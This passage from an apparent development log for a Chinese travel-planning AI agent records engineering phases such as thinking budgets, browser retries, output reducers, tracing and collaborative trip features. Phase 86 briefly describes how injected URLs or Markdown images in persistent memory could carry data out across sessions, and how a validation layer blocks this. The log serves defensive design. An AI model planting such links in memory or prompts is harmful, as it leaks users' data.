完整 dict，取消只在 await 点，不会留半截），超时交回已抓到的；预算 **150→75**（xhs 串行提速已
实测否掉——容器内部串行，并发 38.2s≈串行 41.6s，只剩「等多久」一个旋钮；搜索实测 16–27s，75s
够搜索+2–3 篇详情，晚到不等，必应+高德补位）。**用户取消（CancelledError）照旧向上冒**，部分
收成只针对预算超时。collect 从「最坏 150s 可能得 0」变「封顶 ~75s 必有收成」。② **抽取思考
纪律**：Langfuse 实测「导入行程板」分块抽取烧 **13124 思考 token / 118.6s**（正文仅 971）——
一个「从 Markdown 挑地点填 schema」的任务在长考两分钟，7 天攻略×每天一块。这是 ITINERARY
（Phase 11）、quick_take（Phase 101）之后**第三次**撞「DeepSeek 思考模式对结构化抽取过度推理」，
治法同一味药：共享常量 `EXTRACT_THINKING_DISCIPLINE`（`app/llm/client.py`，不各写一份——手抄必
漂移）append 到**五个**抽取 system（trip_api 的 IMPORT_DAYS/IMPORT_SUMMARY、ontology/extract、
poster、budget）。`max_tokens` **不动**：16000 余量是有意设计（截断重试一次 ~140s 比多想几步贵），
纪律省时间、预算兜安全，各管各的。**刻意不做**：跨用户目的地缓存（更大杠杆但要建共享表+迁移，
单独立项——现复用是 per-user 的，用户 A 昨天抓过杭州、用户 B 今天仍全量重抓）；不减
`xhs_notes_per_turn`（质量旋钮，部分收成落地后自然被预算封顶）。计划
`docs/task_plans/xhs部分收成与抽取思考纪律-2026-08-21.md`，用例
`docs/test_cases/xhs部分收成与抽取思考纪律-验收用例.md`（`tests/test_xhs_mcp.py` 20 passed）。

**Phase 101 — 快答不再阻塞采集**：线上 Langfuse 实测 quick_take 三次里**两次 `out=0 /
reason=1000`**——思考链吃满预算、正文为空，只能靠兜底把**模型的内部独白**前 200 字给用户看
（不是空白，是质量降级）。同 Phase 11 在 ITINERARY 上解决过的那类问题，用同一条已验证的手段治：
system 里加**思考纪律**（「最多两三行要点，把输出预算留给正文」）+ `max_tokens` 1000→1600。
**两条都要**——纪律负责别想太多，预算负责纪律漂移时仍留得下正文（Phase 89 教训：不能把正确性
押在 prompt 遵循上）。② 它还**白挡采集 ~10 秒**：图拓扑 `parse→quick_take→collect` 是硬边，
而快答与采集**没有数据依赖**，这 10 秒里浏览器和小红书一动不动。现在 `quick_take_node` 把
`emit_guide_quick_take` 丢进 daemon 线程立刻返回，采集提前开始。⚠️ **占位仍然同步创建**——
Phase 71 的顺序不变式没松动：占位必须先于快答消息落库，否则 `_is_running` 判本轮完成、前端停止
轮询、完整版永远收不到；并行化只能挪走 LLM 调用。用线程而非 asyncio task：`emit_guide_quick_take`
是同步函数、本节点也是同步的，且仓库里记忆整理/崩溃续跑都是这么起的；线程引用存模块级 set 防 GC，
**不 join**（迟到就迟到，绝不能拖住终稿）。**不改 LangGraph 拓扑**（动 checkpoint 与恢复语义，
收益相同风险大得多）。测试把实现故意改回串行会立刻红（「节点等了 2.0s」），不是摆设。
计划 `docs/task_plans/快答不再阻塞采集-2026-08-21.md`，用例
`docs/test_cases/快答不再阻塞采集-验收用例.md`（`tests/test_guide_quick_take.py` 17 passed）。

**Phase 100 — 地点导航直达**：行程板每个地点都有精确坐标（Phase 62），但用户想真去导航只能
自己打开高德手搜——全仓一处 deep link 都没有。现在地点行加「🧭 导航」直跳用户自己的地图 App。
**不消耗我们的高德配额**：请求由**用户设备**发起、落到高德 C 端，与开发者 key 无关，URL 里不含
任何 key（与 Phase 13/18「静态图后端签名代拉、key 不进前端」是同一条纪律的另一面）；顺带它还是
配额泄压阀——缩放/看周边/导航这些最耗配额的连续交互全转移到高德 App。⚠️ **唯一有技术含量的是
坐标系分流**：`travel_trip_stop.location` 混着两套坐标系（`models.py`：境内 GCJ-02 / 境外 WGS-84），
站内一直安全（GCJ 偏移只在境内生效、境外 GCJ≈WGS，且全程高德渲染），但**往外发链接必须分流**——
高德吃 GCJ 两种情况都原样传；**苹果吃 WGS，境内不转就偏 ~500m 把人导到别的街区，且不报任何错**。
`app/agent/nav_links.py` 纯函数实现 `gcj_to_wgs84`/`out_of_china`/`build_nav_links`，
**只实现 GCJ→WGS 一个方向**（只有「境内+苹果」这一格用到）。转换在**后端**算、经 `_stop_dict`
的 `nav` 字段下发，前端不重算（两端各写一份必然漂移）。测试卡住两个方向：偏移必须落在
100–1000m（太小=没转、太大=转错，两者都静默）、境外必须精确不变、苹果的 `lat,lng` 顺序不能写反。
**刻意不做**：不加到攻略正文（那里没坐标只能降级成关键词搜索会搜歪、无法可靠识别哪个词是地点、
满屏蓝链接与 Phase 64 可读性改造冲突；更根本的是首页问答是**规划**场景而导航是**出行**场景，
真要导航时用户已导入行程板）；不做 WGS→GCJ 反向（无用例）、不做百度（BD-09 还要再转一层）。
计划 `docs/task_plans/地点导航直达-2026-08-20.md`（`tests/test_nav_links.py` 33 passed）。

**Phase 99 — 导航超时不再盲目重试**：线上 Langfuse 实测两轮 guide 各出现一个 **~62s 的
open_page span**（62.4s/62.7s，整齐得不像偶然）——`browser_tool.open_page` 对导航失败一律盲目
重试，坏页面 = 30s 超时 + 再烧 30s。且重导航有**反作用**：超时 ≠ 页面为空，首次超时时页面往往
已部分加载，直接 snapshot 常能拿到内容（reduce_a11y 还会清干净），重导航反而把它重置。现按失败
类型分流（`_looks_like_timeout`，模块级纯函数）：**超时不重导航**、warning + snapshot 兜底
（62s→~32s）；**非超时**（CDP 抖动/连接断）维持重试——那是当初加重试的合理场景，别一起砍。
识别不出来一律当非超时 → 退化方向是保留重试，不会更差。刻意不缩短 30s 首次超时（慢站点真需要）。
计划 `docs/task_plans/导航超时不再盲目重试-2026-08-20.md`，用例
`docs/test_cases/导航超时不再盲目重试-验收用例.md`（`tests/test_open_page_retry.py` 13 passed）。

**Phase 98 — 标签页未读提醒**：Phase 97 之后同行者仍需**打开页面**才看得到铃铛。自然的下一步
Web Push **实测否掉**：投递由浏览器厂商的推送服务中转，服务器实测 `fcm.googleapis.com` **连不上**
（Chrome/Edge 全走它，是绝大多数用户），Mozilla/APNs 通但份额可忽略（Safari 还要先装 PWA）；
且国内用户浏览器本身也连不上 FCM，**服务器搬境外也没用**。改为靠浏览器自己就会显示的东西：
未读时改**标签页标题**（`(3) 17同游…`）+ **favicon 红点**。无需权限、无 Service Worker、
不依赖外部服务，覆盖「人挂着页面在干别的」这个最高频场景。纯函数 `badgedTitle` 在
`interaction.ts`，hook `useAttentionBadge` 接 `Home.tsx` 的 `notificationUnread`（群聊未读天然计入）。
⚠️ 三个要点：①**原始标题只在挂载时捕获一次**——拿 `document.title` 反复加工会叠成 `(1) (2) 标题`，
有性质测试钉死 `badgedTitle(badgedTitle(t,1),2) === badgedTitle(t,2)`；②favicon **只在有/无未读
翻转时重画**，不是每轮轮询都画；③画不出来时静默降级，标题提醒照常。favicon 用 **canvas 在现有
图标上叠红点**而非另备一张图（品牌图标只有一份，换图标不用维护第二份；CSP 的 `img-src data:` 允许）。
**刻意不做**：Web Push（收不到）、微信服务号模板消息（唯一能触达完全离开页面的用户，但需认证
服务号+用户关注绑定，是产品决策）、标题闪烁（干扰大于价值）、按聚焦状态区分（Gmail/Slack 都不区分）。
计划 `docs/task_plans/标签页未读提醒-2026-08-18.md`（`tests/interaction-utils.test.mjs` 35 passed）。

**Phase 97 — 群聊消息进通知中心**：Phase 61 的群聊未读**只在行程板内部**（`Trips.tsx` 的本地
state 靠轮询比对算出），人不进那个页面就永远不知道有人说话。现在 `add_chat_message` **同事务**
给除发送者外的每个 accepted 成员写 `TravelNotification`（`type=trip_chat`、`target_kind=trip`），
主页铃铛（Phase 84）直接可见。**`dedupe_key=trip-chat:{trip_id}:{接收者}`**——一个行程刷 20 条
消息每人只有**一条**通知在刷新，不会冲爆铃铛（沿用 Phase 84 的模式）；`meta.count` 需**先读一次
旧行**才能累计（`upsert_notification` 会覆盖成未读，否则永远是 1），已读过的则从 1 重新数。
已读走**显式** `POST /api/trips/{id}/chat/read`，**刻意不在 `GET /chat` 里顺手标已读**——前端关着
面板也在 8s 轮询，GET 带副作用会让它自己把自己标成已读、徽标永不亮。**不加 `last_read_at` 列**：
通知行自带 `read_at`，语义够用，少一张状态表少一处不同步。`delete_trip` 里
`delete_target_notifications("trip", …)` 撤销（否则点开跳 404）；**删单条消息不撤销**（「有人说过话」
仍成立，撤销要判断是否最新条+回退 count，复杂度换不来价值——有回归测试钉住这个有意决策）。
前端：通知面板认 `trip_chat`（💬 图标、`count>1` 显示「等 N 条」），点击跳到对应行程并
**自动展开群聊抽屉**——用**自增序号**而非布尔值触发，否则连点两条不同行程的通知时第二条打不开。
计划 `docs/task_plans/群聊消息进通知中心-2026-08-18.md`，用例
`docs/test_cases/群聊消息进通知中心-验收用例.md`（`tests/test_trip_chat_notify.py` 11 passed）。

**Phase 96 — 工具输出按结构裁剪**：`app/agent/reducers.py`（借鉴 dsh 社区插件 toolshrink）。
Phase 90 的 `truncate.py` 解决「截断要幂等」，没解决「**截哪里**」——按位置下刀在网页上的
真正后果是**前面全是导航**：维基百科「西湖」在生产参数 limit=4000 下，窗口里 3566 字是主菜单
和目录、正文只剩 434 字。现在按**结构**下刀，纯 stdlib（`html.parser`）、**零模型调用**
（"语义"不是理解内容，是**认得格式**；判断力在写 reducer 时付出，运行时只做模式匹配，
所以不增加延迟）。两个 reducer：`reduce_html`（丢 `script/style/nav/header/footer/aside` 及
class/id 命中 `nav|menu|sidebar|footer|toc|comment…` 的容器，保留 h1-h6/列表/表格行，解码实体，
去引用角标）接 `research_tools._html_to_text`；`reduce_a11y`（**只取引号里的 label**，无引号
即纯结构节点丢弃，连续重复行折叠）接 `browser_tool._snapshot_to_text`——该函数此前**名不副实**，
docstring 写"提取正文"而实际只做头部截断，喂进模型的是带 uid/role/属性的 a11y 树原文。
认不得的格式**原样通过**（`reduce_auto`），兜底是调用方原有的**尾部截断**（`text[:limit]`）。⚠️ 订正：Phase 90 的 `truncate.py`（`TruncateBudget`/`TOOL_RESULT`/`BRIEF`，中段截断）**在 app/ 里一次都没被调用**，只有测试引用——它是死代码；生产里所有截断都是 `[:n]` 尾部切片。这不构成正确性问题（尾部截断本身幂等，需要那个模块的是中段截断），但别再以为它在生效。真机实测：HTML 省
13-33%、chrome 特征串归零；a11y 快照去哪儿 31144→4324(-86%)、必应 -65%、百度百科 -80%，
结构残留 0。⚠️ 三个**静默失效点**（不抛异常、日志干净、内容悄悄少了，全是真实样本才暴露的）：
①维基 `<html class="…-toc-pinned-…">` 命中 chrome 规则致整页归零 → 根元素永不按属性丢弃 +
**过度裁剪检测**（裁完不足朴素提取 15% 就退回，真实数据上救过 JS 空壳页）；②裁剪产物已无引号，
a11y reducer 第二遍会把内容吃光 → 入口加「认不得就别动」的门保幂等；③相邻内联标签文本无分隔
拼接（`清除<i>历史</i>记录`→`清除历史记录`，中文无害但英文会粘成 `HotelBooking`）→ 仅在两侧
都是 ASCII 字母数字时补空格。**不动**：高德（`build_amap_source` 早就是手写 reducer）、
`web_search`（已是紧凑行）、小红书正文（散文，且走 xhs_mcp 不经此链路）。**不引入
readability/bs4**（stdlib 够用、服务器内存紧）；**不做相关性裁剪**（会依赖调用上下文、破坏幂等）。
真实页面与**真机快照** fixture 冻结入库（`tests/fixtures/pages/`，gzip ~220KB，快照复现不了
故不能按需拉取）。坑见 `docs/pitfalls/按结构裁剪文本的三个静默失效点.md`，计划
`docs/task_plans/工具输出按结构裁剪-2026-08-18.md`，用例
`docs/test_cases/工具输出按结构裁剪-验收用例.md`（`tests/test_reducers.py` 37 passed）。

**Phase 89/95 — 重复调用守卫按调用方分链**：`app/agent/repeat_guard.py`（从 dsh 移植）与
Phase 28 硬配额互补——配额治「总量超标」，它治「同一个查询反复调」：链键 =（工具名, 深度排序
参数），连续到阈值就在工具返回值后**追加**升级式提醒，**不阻断**（合法重复一次都不该被拦）；
排除的工具对链透明（否则记账工具能把 `search X → read_source → search X` 洗白）；失败调用也计数。
**Phase 95 改为按调用方分链**：此前主 agent 与全部 subagent 共享一条链，并发子代理用相同参数调
`amap_*`/`fetch_url` 会互相累加成假重复——注入的是一句**事实错误**的系统提示（「你已连续 3 次
调用 X」而它其实是第一次），模型无从核对只能采信，可能因此放弃合法的首次查询。身份取自 LangChain
注入的 `config` 里 **`checkpoint_ns` 的父链前缀**（`owner_from_config`）：实测同一子代理跨
superstep 稳定、并发子代理互不相同；而 `parent_run_id` 每个 superstep 都变，**不能**直接当键
（要用它就得耦合 `SubagentTracker` 的 run 树）。**不用 dsh 的 WeakMap**——它需要弱引用是因为链表
长生命周期靠 GC 清理，我们的 guard 每轮新建、轮末丢弃，普通 dict 即可（另有 `MAX_OWNERS` 兜底）。
分链后放宽阈值的理由消失，改回 dsh 的 **3/5/8**（原 3/6/10）。⚠️ 给 wrapper 加 `config` 参数有
三个**静默失效**点（`functools.wraps` 让新参数对 LangChain 不可见 / 它复制的是同一个
`__annotations__` dict 会污染原函数 / config 混进链键则守卫彻底失效），全部有回归测试钉住，
另有 `ToolNode` 集成测试钉住「真实路径确实注入 config」——否则退化成共享单链是无声的。
注意**硬配额仍是全轮共享**，那是整轮预算的有意设计，别顺手一起分开。
坑见 `docs/pitfalls/给工具加参数时functools-wraps会让它隐形.md`，计划
`docs/task_plans/重复调用守卫按调用方分链-2026-08-18.md`，用例
`docs/test_cases/重复调用守卫按调用方分链-验收用例.md`（`tests/test_dsh_ports.py` 53 passed）。

**Phase 93 — 评估集扩建（路由 + 本体抽取 + 过程验证换证据源）**：`evals/` 原本只测攻略正文
（11 条 query、三层验证、一轮 1 小时），本体层与路由分流落在射程外。新增两个**轻量离线集**，
不动原来那个重家伙：① `evals/routes.yaml` + `route_eval.py`——`decide_route` 三分类 35 条，
判错分**硬错**（落在 tolerate 外，用户直接感知）与**软错**（ROUTE_SYSTEM 自己写着「拿不准一律
选 guide」的保守降级），闸门只看硬错；`--repeat` 看**摇摆**（摇摆比稳定判错更危险，单列不进
准确率）。首轮基线 91.4%（32/35）、硬错 0、guide 行满分。② `evals/extract.yaml` +
`extract_eval.py`/`extract_checks.py`——输入是 5 篇**固定的真实攻略**（天数 3/3/5/7/10，后两者
超 `ontology_single_call_max_days`(6) 走分块路径），只调 `build_trip_object` 一步。样本
**不进 git**（`fetch_samples.py` 按 message_id 拉 + 校验 sha256——输入漂了而期望没改是最难查的
评估失真）。检查项对着下游具体后果：`ext_total_as_item`（合计行进逐项 → **总额翻倍**，Phase 67
不变式）/`ext_headcount`（「两人合计」认成 1 人 → 人均翻倍）/`ext_empty_lane_registered`
（空结果登记了 lane → **被缓存固化永不重试**）等。③ 过程验证（`verify.py`）主证据源从
**进度气泡文案正则**换成 **Langfuse 轨迹 span 名**（文案是 UI 字符串改一句就静默失效，span 名是
代码常量），文案降为回退；规则⑥改成「两源都空才算失效」，另加规则⑦：轨迹可用但文案模式全打空
时**警告不失败**（Langfuse 一停用这层会无声退化）。配套补齐缺失 span：`xhs_search`/`xhs_detail`
（xhs_mcp）、`amap_city_brief`（orchestrator）、`site_ctrip`/`site_xhs`（site_router，为此拆成
外壳+`_collect_via_site`，span **含登录等待**——那常是整轮最慢的一段）——**这些工具此前在轨迹
面板里也是隐形的**。⚠️ 立集当天踩的坑：生产 `decide_route` 把 API 异常兜底成 guide，评估直接
复用它 → 断网和「模型判成 guide」返回值完全一样，报出「准确率 42.9%、模型偏向 guide」的**假
结论**。现在评估侧自己接异常标 `run_error`，准确率分母只算跑成的条数，退出码 2≠1。一般化：
**凡生产有「失败静默降级」的地方，评估都不能复用那条路径**。计划
`docs/task_plans/评估集扩建-路由与本体抽取-2026-08-14.md`，用例
`docs/test_cases/评估集扩建-验收用例.md`，坑
`docs/pitfalls/评估器把断网算成了模型判错.md`。**刻意不做**：不把 61 篇踩坑逐条变检查项
（大半是基础设施，塞进输出质量闸门只稀释信号）、不扩 `queries.yaml`、不做 LLM 打分、不进 CI。

**Phase 87 — 协同行程板 PRD 改造**：按《好友协同旅游-高保真架构图-改造版》重构行程板界面
结构并补四个协作模块。**PRD 的 P0「地基」在本项目已存在**（账号 Phase 15、持久化 PG、
多行程首页+invite_token、2.5s 轮询同步+`TravelTripEvent` 留痕），故只落地 4.2/4.3/4.4/4.5。
新增 5 张表 + `app/api/trip_modules_api.py`（全部过 `trip_api._member()`，写操作落
`_log_event`）：`travel_trip_food`（美食，TOP 置顶）/`travel_trip_task`（任务，
assignee 为 null=待认领，模板任务）/`travel_trip_packing_item` + `travel_trip_packing_state`
（行李三态，**(item,user) 一行一格而非 item 上挂 JSON**——多人高频点击时整体覆写会互相冲掉）
/`travel_trip_tip`（避坑，important 排前）。前端 `TRIP_TOOL_TABS` 按 PRD 顺序扩到 9 个并
**删掉右栏那套完全重复的 `trip-ai-tabs`**（同样的标签、同样的 `setAiTab`）；头部加
`tripStatus()` 状态角标；`FAB_BY_TAB` 情境化悬浮按钮**不重复实现新增逻辑，只聚焦当前面板的
输入框**（校验/提示仍只有一处）。**两处不采纳 PRD**：①配色维持 Phase 66 品牌统一，不改暖橙；
②群聊不"跳微信"——Phase 61 已自建且有未读徽标，跳走是倒退，只有相册按 PRD 走轻量（复用
`ShareButton`）。**三态点击不写 event**（高频，会刷爆时间线，有回归测试钉住）；**可以代同伴勾**
（出发前一人统一核对是真实场景），`packing_state.updated_by` 留痕、界面显示「由 X 代勾」
角标。⚠️ 该列踩了坑：`create_all` **只建缺失的表、不给已有表加列**，同日二次部署时
模型有列、库里没有 → 必须在 `migrate.py` 显式 `ADD COLUMN IF NOT EXISTS`，
见 `docs/pitfalls/create_all只建表不加列.md`（sqlite 单测永远发现不了这类问题）。
计划 `docs/task_plans/协同行程板PRD改造-2026-08-13.md`，用例
`docs/test_cases/协同行程板PRD改造-验收用例.md`（`tests/test_trip_modules.py` 17 passed）。

**Phase 86 — 本体层（Ontology）**：消灭「攻略 Markdown 被三处各用 LLM 再解析一遍」
（poster `guide[:6000]` / budget `guide[:6000]` / 行程导入分块）——三份互不一致的解读 +
结尾预算表被截断丢失。新增 `app/ontology/`：**Object**（`objects.py`：Trip/Day/Stop/
Expense/Reservation/Lodging/Food/Specialty，**id 由内容派生**故重复抽取自动归一去重）、
**Link**（`TripObject.LINKS` 显式声明 + `stops_of_day/day_of/lodging_of_day` 访问器）、
**Action**（`actions.py`：`SetMemory`/`DeleteMemory` + `apply_actions` 校验→应用→审计）。
`extract.py` 是**全系统唯一**一处从攻略抽结构（短篇单次；超 `ontology_extract_max_chars`
(24000) 按 Day 切块，结尾预算/美食章节切回全局部分，单块失败只记 `failed_days`）；
新表 `travel_guide_object` 按 `source_hash`+`schema_version` 双重失效；`store.ensure_trip_object`
抽一次+缓存（**懒构建不预热**，第一个点击者承担）。`projections.py` 纯函数投影到
**既有视图模型**（`to_poster_data`/`to_budget_data`/`to_trip_draft`/`to_outline`），故 poster
补坐标流水线、budget 服务端汇总、导入落库逻辑一行未改。消费端各包 try/except 回退，
`ontology_enabled=False` 整体退回旧路径。导入快路径只读缓存不触发抽取（`only_days` 重试仍走
原路径，它有逐天进度和按天重试）。**Action 层的价值在安全**：`apply_ops` 不再直接写库，
纯结构校验挡住记忆里的 URL/Markdown 图片（记忆每轮进 prompt，带外链=**跨会话**数据外带，
Phase 69 ③ 的持久版）、标签字面量、超长内容/非法 key、跨用户删除。
**刻意不做**：措辞过滤（沿用 context_security 判断）；**不碰 explicit 覆盖语义**——
`_upsert_by_key` 允许推断内容覆盖 explicit 槽位内容、只保粘性权重是 Phase 17 有意决策
（`test_explicit_is_sticky_and_weighted` 断言之），一度加的「外部来源不得覆盖 explicit 槽位」
已撤回（还有反效果：注入抢占槽位后用户的对话更正也会被挡）。该张力见
`~/Desktop/working/本体论改造说明.md`（仓库外）第六节。计划 `docs/task_plans/本体化改造-2026-08-13.md`，
用例 `docs/test_cases/本体化改造-验收用例.md`（`tests/test_ontology.py` 41 passed）。

**Phase 85 — 同游圈侧栏头像完整显示**：左下角当前用户入口不再使用 36px 默认头像，改为
46px 独立清晰规格；图片在该入口内使用 `object-fit: contain` + 居中定位，并以描边和背景承接
可能的边缘留白。规则限定在 `.social-me-mini`，不影响主页、好友列表和接力卡头像。坑见
`docs/pitfalls/复用头像组件也要区分展示密度.md`。

**Phase 82 — 接力站任意目的地与交互简化**：接力站不再把天堂寨等固定标签表现为支持范围，
首屏改为醒目的任意目的地输入框（Enter/按钮进入），固定城市仅作快捷项；删除重复的大幅统计 Hero，
主流程收敛为“找地方 → 看动态 → 发接力”。发布器把内部的 `phase + kind` 双选择合并成三个用户
动作：提问题→planning、报现场→on_trip（72h）、分享路线→returned，并允许发布时修改目的地。
前端映射常量为 `POST_PHASE_BY_KIND`，后端协议不变。坑见
`docs/pitfalls/后端支持任意值不等于界面没有功能边界.md`。

**Phase 81 — 目的地接力站与个人社交系统**：首页低数据价值的“实境预演”入口替换为
“同游圈 / 目的地接力站”，按目的地聚合 `准备去 / 正在玩 / 刚回来` 三阶段公开内容；支持
现场情报（72 小时过期）、路线分享、目的地提问，以及有用/已验证/已失效单选反馈。后端
`app/api/social_api.py` + `TravelRelayPost/Reaction` 全部登录可用，公开字段走白名单，私密主页作者
的内容与聚合统计同时隐藏。`TravelFriendship` 使用规范化用户对状态机，好友不会自动获得私人会话、
记忆或行程权限。`TravelUser` 增加显示名、头像上传 ID、简介、常驻城市、旅行风格和公开开关；头像
复用 `TravelUpload` 并校验上传归属。前端懒加载 `SocialHub`，包含接力站、好友搜索/申请/处理、
公开/个人主页、头像上传、统计与最近接力，桌面侧栏和移动底栏均有入口。坑见
`docs/pitfalls/社交关系不能等同于私密行程授权.md`。

**Phase 66 — 17同游品牌统一**：面向用户的品牌从 `travelX / 旅行智能体` 统一为中文
“17同游”、域名标识 `17tongyou` 和短句“一起规划，一起出发”。`Brand.tsx` 提供复用的路线
图标与 wordmark；favicon 改为蓝紫圆角路线箭头并以 `?v=2` 刷新微信缓存。HTML title、
Open Graph、登录页、侧栏、移动顶部栏、路线图页脚和面向用户的 LLM system prompt 已同步；
内部 API/数据库/服务名不改。坑见 `docs/pitfalls/品牌改名不能只改浏览器标题.md`。

**Phase 65 — 移动端 UI 应用壳**：`Home.tsx` 根节点增加 `view-desktop/view-mobile` 状态，
右上角提供双模式切换并写入 localStorage；窄屏或粗指针真机首次访问强制移动端，避免桌面偏好
污染手机。移动版使用紧凑顶部栏、四项底部导航、transform 侧栏抽屉、单列消息/攻略和双层贴底
输入框；宽表格、消息操作在组件内部横滑，底部元素统一适配 iOS safe area。桌面选择移动端时
提供居中的手机宽度预览，协同行程同步强制三分区单面板结构。坑见
`docs/pitfalls/移动端不能只靠断点压缩桌面布局.md`。

**Phase 64 — 旧攻略补图与阅读排版**：多轮修改遇到“补图/图片/配图/图文/含图/照片/实景图”
且旧来源图片不足 3 张时，不再直接复用旧 `sources`，会按当前目的地刷新小红书图片并按 URL
合并（同源补字段、新有图源追加、空图丢弃）；普通“拍照机位”不误触发。模型漏占位符时，
小红书灵感图最多分散补到前 5 个 Day/章节。攻略 prompt 固定“速览→今日路线→四列表格→
少量关键提示”，避免深层嵌套文字墙；前端 `GuideBody` 增加标题卡、Day 卡、章节标题、
响应式表格和完整比例图片样式。坑见 `docs/pitfalls/多轮补图复用旧来源导致零图片.md`。

**Phase 63 — 协同原攻略与小红书配图**：协同板不再把 editor 带进 owner 的私人会话；
`GET /api/trips/{id}/source-guide` 复用行程成员校验，只返回导入的 assistant 攻略正文与公开来源，
owner 才得到返回原对话标识。前端“查看原攻略”在板内打开支持 GFM/图片/来源的只读抽屉。
`xhs_mcp.py` 解析线上 `imageList/urlDefault`，每篇限封面+一张内页并接入 `source.images`；
生成提示要求分散配图，终稿漏用时最多补三张到不同章节。图片代理新增 `xhscdn.com` 官方白名单、
小红书 Referer，并在重定向后复验最终域名。详见
`docs/pitfalls/协同原会话越权与小红书图片字段.md`。

**Phase 62 — 海外行程坐标修复**：协同行程地理编码改为国内/海外分流：
`app/tools/geocode.py` 先解析逐日城市国家，国内高德候选强制行政区匹配；海外用
Open-Meteo/GeoNames（城市）+ Photon/OSM（POI，自定义 User-Agent、全局限速、持久缓存），
并按 country code + 城市锚点 120km 校验；海外攻略地点另带英文/当地官方 `search_name`。
缓存键升级为 `v2|provider|country|city|name`，隔离 Phase 55 旧污染。导入/新增/一键串路线
均按 day_plan 的 overnight_city 查询；`POST /api/trips/{id}/geocode/repair` 可修已有行程，
无新结果且旧坐标明显跨国则清空。检查中心多次超长跳点报 `geocode`，海外 segment-times
不调用高德 direction，返回带 `estimated=true` 的透明估算；前端有“重新定位”和估算徽章。

**Phase 61 — 协同行程群聊**：每个 `travel_trip` 自带成员群聊（不另建群关系），消息表
`travel_trip_chat_message`；`GET/POST/DELETE /api/trips/{trip_id}/chat...` 全部复用成员校验，
只允许删除自己的消息，默认最近 100 条并支持 `after` 增量。前端行程板成员头像旁有群聊入口+
未读徽标，`TripChat` 右侧抽屉打开时 2.5s 增量轮询、关闭时 8s 检查未读；消息左右气泡、
Enter 发送/Shift+Enter 换行，移动端全屏。地点留言继续保留，承载具体地点上下文。

**Phase 60 — 思考加载体验**：前端把运行期间的普通 progress 消息收拢为统一
`ThinkingWorkspace`：根据现有文案/流式状态推断「理解需求→搜集资料→整理方案→生成内容→
检查优化」五阶段，显示最新动作、运行计时、停滞说明和停止入口；反思补搜时阶段只前进不倒退。
登录接管/来源确认卡仍独立展示，流式正文首段出现后工作台退场。渐变思考核心、轨道/波形/shimmer
动效均支持 `prefers-reduced-motion`，手机端阶段转为紧凑纵向布局。纯函数在
`frontend/src/interaction.ts`，视图在 `frontend/src/pages/Home.tsx`。

**Phase 25 — 平台内调用链面板**：助手消息「🔗 调用链」按钮 → 右侧抽屉（TraceDrawer）展示
该轮 trace 树（类型徽章/模型/耗时，点节点看完整输入输出/tokens）。后端
`GET /api/chat/{cid}/trace?turn_id=`（`app/api/trace_api.py`，登录+归属校验，pk/sk 不出
服务端）查本机 Langfuse API，按 metadata.turn_id 匹配该轮（回退最新），载荷截断 4000 字符。

**Phase 24 — Langfuse 埋点**：`app/observability.py`（enabled/turn_trace/span/
langchain_handler/wrap_openai_client_cls/flush，**无 key 全 no-op、异常只 warn**）。
三层：turn 级（run_conversation_turn 包 trace，session_id=cid 按会话分组，metadata 带
route）；LLM 级（LLMClient 条件换 `langfuse.openai` drop-in，全部 DeepSeek 调用的
prompt/补全/用量自动记录）；工具级（研究模式 agent config 挂 `langfuse.langchain.
CallbackHandler` 全图追踪；guide 流水线 web_search/open_page 手动 span）。
`LANGFUSE_ENABLED` + pk/sk 填 .env 生效（云版 cloud.langfuse.com 或 self-host）。

**Phase 23 — 深度推理开关**：research **只经用户开关进入，不再自动触发**（4-6min 应由用户
掌控）。`resolve_route(text, llm, deep_reasoning)`：开关开→跳过分类直接 research（服务器未启
用则 guide）；开关关但判为 research→**direct 快速回答**（guide 是单目的地设计会反问选哪个）
+ 写 `meta.hint="deep_reasoning"` 的 progress（带 meta 不被 clear_plain_progress 清，前端渲染
提示卡带「打开深度推理」按钮）。前端 composer「🧠 深度推理」胶囊开关（localStorage 持久，
`SendMessageRequest.deep_reasoning` 透传）。`deep_research_recursion` 默认 80（40 实测复杂
对比题 GraphRecursionError），超限优雅降级提示。

**Phase 22 — 轻量直答通道**：`run_conversation_turn` 入口三路路由
（`deep_research.decide_route`，v4-flash 单次分类 ~1s，取代原 research 关键词门）：
**direct**=常识/建议/追问/闲聊 → `orchestrator.run_direct_answer`（无浏览器无来源，
三元组记忆+近5轮历史 → 单次流式生成，线上首字 6s/全程 17s，此前同类问题 2-4min）；
**guide**=规划/攻略/查酒店 → 原 LangGraph 流水线；**research** → deepagents。
分类失败/未知/空消息/开关关一律 guide（宁慢勿错）。`direct_answer_enabled`(True) 可关。

**Phase 21 — 深度研究模式**（deepagents 试点）：开放式问题（多城对比/预算测算/签证/帮我选）
主流水线接不住（单目的地 Preference、产出模子固定、搜索深度固定），路由到
`app/agent/deep_research.py`：`decide_research`（关键词门+快模型确认，失败回落主流水线）→
`create_deep_agent`（DeepSeek + langchain-deepseek）。**资源分工**：浏览器（web_search/
open_page）只在主 agent——`research_tools.BrowserSession` 用 **actor 模式**（专职 worker task
独占 ChromeMCP 生命周期，工具经队列提交；mcp stdio_client 是 task-affine 的，跨 task 进出会炸
cancel scope 且泄漏池槽位，见 pitfalls）；subagent `api-researcher` 只有纯 API 工具
（amap_city_brief/amap_poi/fetch_url，fetch_url 带 SSRF 防护）。system_prompt 写**硬性资源纪律**
（天气景点必须走高德、web_search 全程≤3 次、URL 整批派 subagent 读），否则弱模型会挥霍浏览器
超时。停止=工具内 cancel.check + invoke 看护；`deep_research_timeout_s`(600) 兜底；
`deep_research_enabled` 默认关（服务器 .env 开）。

**Phase 20 — 历史会话召回改造**：`memory.recall_past_chats` 只引**标题命中当前目的地**的旧会话
（不再倒灌无关最近会话）；`_first_guide_reply` 跳过流式占位/海报/停止报错/过短(<120)的无效回复，
`_clean_snippet` 去 markdown。历史对话卡=跨会话检索（≈ChatGPT 引用聊天记录，按用户隔离）；
真正 dreaming 味的是偏好卡的每轮三元组提炼。

公共组件：`ChromeMCP`（stdio 连 chrome-devtools-mcp，锁定版本，本地连调试Chrome/服务器
自启动 headless）、`BrowserTool`（snapshot 两步交互+限速+截断）、`action_guard`
（动作分层→元素判定→页面类型检测）、`LLMClient`（DeepSeek，parse 结构化 /
generate_with_reasoning 返回正文+思考）。

关键不变式：
- 所有 click/fill 必须过 Action Guard；navigate/snapshot 等只读动作永远放行
- MCP 工具返回 `isError` 必须抛异常，不能当正常结果（踩过坑）
- LLM 封装不透传 temperature 等采样参数；结构化输出必须走 `parse()` 而非裸 prompt

## Notes for future work

- The `.idea/` directory is JetBrains IDE metadata, not application code — do not treat
  it as source.
